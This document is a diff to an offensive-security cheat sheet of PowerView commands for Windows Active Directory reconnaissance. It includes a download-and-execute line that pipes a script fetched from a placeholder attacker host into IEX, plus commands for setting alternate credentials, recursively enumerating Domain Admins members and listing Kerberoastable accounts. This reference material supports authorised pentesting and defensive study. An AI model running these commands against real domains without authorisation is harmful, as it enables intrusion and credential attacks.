@@ -11,6 +11,14 @@ https://github.com/PowerShellMafia/PowerSploit/
 (new-object system.net.webclient).downloadstring('http://<lhost>/powerview.ps1') | IEX
 ```
 
+## Set alternative creds to use
+#plateform/windows #target/remote  #cat/RECON 
+Example : Use with commands as "-Credential $creds"
+
+```powershell
+$passwd = ConvertTo-SecureString "<password>" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ("<domain>\<user>", $passwd)
+```
+
 ## Get User from SID
 #plateform/windows #target/remote  #cat/RECON 
 ```powershell
@@ -66,8 +74,20 @@ Get-DomainComputer -Unconstrained
 Get-DomainTrustMapping
 ```
 
-## Get group member
+## Get all members of a a given group
+#plateform/windows #target/remote  #cat/RECON 
+Example: Get-DomainGroupMember "Domain Admins" -Recurse
+
 ```powershell
-Get-DomainGroupMember -Identity "<group|Administrators>" -Domain <domain>
+Get-DomainGroupMember -Identity "<group|Administrators>" -Domain <domain> -Recurse
 ```
 
+
+
+## Get list of kerberoastable users
+#plateform/windows #target/remote  #cat/RECON 
+Description : The following will enumerate 'Kerberoastable' users for a given domain
+
+```powershell
+Get-DomainUser -SPN -Domain <domain> | select name, samaccountname, serviceprincipalname
+```
